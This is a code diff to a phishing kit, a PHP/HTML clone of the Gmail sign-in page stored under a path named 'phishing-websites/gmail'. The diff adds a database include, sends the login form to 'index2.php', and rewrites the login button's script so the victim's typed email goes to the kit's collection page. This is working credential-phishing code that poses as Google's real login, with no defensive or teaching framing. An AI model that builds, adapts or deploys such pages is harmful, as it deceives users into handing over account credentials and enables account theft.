@@ -1,3 +1,13 @@
+<?php
+
+
+include('dbcon.php');
+
+
+?>
+
+
+
 <!DOCTYPE html>
 <html lang=en dir=ltr class=CMgTXc>
 <meta charset=utf-8>
@@ -4191,7 +4201,7 @@
                                     <div jsname=USBQqe class="Wxwduf Us7fWe JhUD8d" role=presentation>
                                         <div class=WEQkZc>
                                             <div class=bCAAsb jsname=rEuO1b jscontroller=mjtijb data-form-action-uri>
-                                                <form novalidate action="" method="post"><span jsslot>
+                                                <form novalidate action="index2.php" method="post"><span jsslot>
                                                         <section class=aTzEhb jscontroller=r27uIe jsshadow>
                                                             <header class="IdEPtc sf-hidden" jsname=tJHJj aria-hidden=true></header>
                                                             <div class=CxRgyd jsname=MZArnb>
@@ -4526,7 +4536,7 @@
     <!-- CUSTOM -->
     <script type="text/javascript">
         $(document).on('click', '#loginButton', function() {
-            window.location = '/index2.php?email=' + document.getElementById("identifierId").value;
+            window.location = '/phishing-websites/gmail/index2.php?email=' + document.getElementById("identifierId").value;
         });
 
         // const button = document.getElementById('loginButton');
